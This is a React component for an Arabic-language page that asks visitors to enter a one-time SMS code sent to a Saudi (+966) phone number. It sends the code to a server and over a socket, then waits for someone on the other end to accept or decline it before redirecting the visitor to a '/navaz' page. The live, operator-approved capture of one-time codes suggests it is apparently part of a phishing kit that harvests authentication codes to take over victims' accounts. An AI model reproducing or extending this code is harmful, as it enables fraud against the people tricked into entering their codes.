import React, { useEffect } from "react";
import { useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
import { serverRoute, socket } from "./Home";
const MobOtp = () => {
  const [phoneOtp, setPhoneOtp] = useState(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const [STC, setSTC] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const stc = query.get("stc");
  const [counter, setCounter] = useState(180);
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();

    try {
      await axios
        .post(serverRoute + "/mobOtp/" + sessionStorage.getItem("id"), {
          mobOtp: phoneOtp,
        })
        .then(() => {
          console.log("DOne");
          socket.emit("mobOtp", {
            id: sessionStorage.getItem("id"),
            mobOtp: phoneOtp,
          });
        });
    } catch (error) {}
  };
  const ID = sessionStorage.getItem("id");

  socket.on("acceptMobOtp", ({ id, price }) => {
    if (id === sessionStorage.getItem("id")) {
      return navigate("/navaz?otp=" + price + "&stc=" + null);
    }
  });

  socket.on("declineMobOtp", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setLoading(false);
      navigate("/phone");
    }
  });

  return (
    <>
      <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
        <form
          className="bg-white border h-screen border-gray-300 rounded-md  p-3 py-10 text-sm w-full"
          dir="rtl"
          onSubmit={handleSubmit}
        >
          <h2 className="font-bold text-xxl my-2  "> التحقق من رقم الهاتف</h2>
          <p className="py-1 text-xs font-bold text-gray-500 flex flex-col gap-y-2">
            <span> تم ارسال رسالة نصية إلي جوالك علي رقم الهاتف الخاص بك</span>
            <span>يرجي إدخال رمز التحقق المرسل إلي جوالك +966 ********</span>
          </p>

          <div className="flex justify-start p-1 py-3 items-start gap-y-2 w-full flex-col">
            <span className="font-bold"> رمز التحقق *</span>
            <input
              value={phoneOtp}
              required
              onChange={(e) => setPhoneOtp(e.target.value)}
              dir="ltr"
              placeholder="******"
              inputMode="numeric"
              minLength={4}
              type="text"
              className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
            />
          </div>

          <div className="w-full flex items-center justify-center py-5">
            {" "}
            <button className="  px-5 flex justify-center items-center py-2  bg-sky-800 text-white w-11/12 rounded-md ">
              تأكيد
            </button>
          </div>
          <div className="flex w-full gap-x-3 items-center justify-center">
            سيتم إرسال رسالة كود التحقق خلال دقيقة
          </div>
        </form>
        {loading ? (
          <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
            <TailSpin
              height="50"
              width="50"
              color="white"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
          </div>
        ) : (
          ""
        )}
      </div>
    </>
  );
};

export default MobOtp;
